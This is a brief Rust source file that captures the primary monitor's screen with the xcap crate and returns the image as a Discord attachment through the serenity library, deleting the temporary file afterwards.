use serenity::all::CreateAttachment;
use xcap::Monitor;

pub async fn make_screenshot() -> CreateAttachment {
    let monitors = Monitor::all().unwrap();

    let imagee = monitors[0].capture_image().unwrap();
    let _ = imagee.save("screenshot.png");

    let ch = CreateAttachment::path("screenshot.png").await;
    let _ = std::fs::remove_file("screenshot.png");

    return ch.unwrap();
}

